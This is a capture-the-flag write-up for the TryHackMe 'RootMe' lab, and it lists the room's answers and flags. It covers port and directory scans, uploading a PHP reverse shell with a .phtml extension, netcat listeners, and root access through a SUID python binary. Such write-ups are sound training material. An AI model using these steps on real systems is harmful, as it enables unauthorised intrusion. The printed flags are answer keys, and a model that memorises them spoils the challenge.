# [RootMe CTF Write-up](https://tryhackme.com/room/rrootme)

## Overview
This document details the steps and findings of the RootMe challenge on TryHackMe.

## Initial Scanning
### Using Nmap
```bash
# Basic Scan
nmap 10.10.62.4
# Result:
# 22/tcp open  ssh
# 80/tcp open  http

# Version Scan
nmap -sV 10.10.62.4
# Result:
# 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
# 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

## Directory Enumeration
### Using GoBuster
```bash
gobuster dir -u http://10.10.62.4 -w ./Documents/Vault/Database/wordlists/SecLists/Discovery/Web-Content/common.txt
# Result:
# /.htaccess            (Status: 403) [Size: 275]
# /.htpasswd            (Status: 403) [Size: 275]
# /.hta                 (Status: 403) [Size: 275]
# /css                  (Status: 301) [Size: 306] [--> http://10.10.62.4/css/]
# /index.php            (Status: 200) [Size: 616]
# /js                   (Status: 301) [Size: 305] [--> http://10.10.62.4/js/]
# /panel                (Status: 301) [Size: 308] [--> http://10.10.62.4/panel/]
# /server-status        (Status: 403) [Size: 275]
# /uploads              (Status: 301) [Size: 310] [--> http://10.10.62.4/uploads/]

```
## Exploitation
### PHP Reverse Shell Script
```bash
found here : https://github.com/pentestmonkey/php-reverse-shell
```
### Port Checking and Connection
```bash
# Listening on Port 5555
nc -l 5555

# Testing Connection
telnet 192.168.68.129 5555
```
### Executing Reverse Shell
```bash
# Uploaded modified PHP reverse shell script from pentestmonkey to target's /uploads directory as .phtml
# URL: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
# Executed 'nc -nvlp 5555' on my machine and accessed file.phtml on the target's server
```

## Challenge Questions and Answers

- How many ports are open?

```bash
2
```

- What version of Apache is running?
```bash
2.4.29
```

- What service is running on port 22?
```bash
ssh
```

- Find directories on the web server.
```bash
# Result:
# /.htaccess            (Status: 403) [Size: 275]
# /.htpasswd            (Status: 403) [Size: 275]
# /.hta                 (Status: 403) [Size: 275]
# /css                  (Status: 301) [Size: 306] [--> http://10.10.62.4/css/]
# /index.php            (Status: 200) [Size: 616]
# /js                   (Status: 301) [Size: 305] [--> http://10.10.62.4/js/]
# /panel                (Status: 301) [Size: 308] [--> http://10.10.62.4/panel/]
# /server-status        (Status: 403) [Size: 275]
# /uploads              (Status: 301) [Size: 310] [--> http://10.10.62.4/uploads/]
```

- What is the hidden directory?
```bash
/panel/
```

- Find a form to upload and get a reverse shell, and find the flag.
```bash
#  find / -type f -name "user.txt*"
THM{y0u_g0t_a_sh3ll}
```

- Search for files with SUID permission, which file is weird?
```bash
# find / -perm -4000 -type f 2>/dev/null
/usr/bin/python
```

- Privilege Escalation

```bash
# Used GTFOBins
# Executed 'python -c 'import os; os.system("/bin/sh")'' for root access
# Located root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```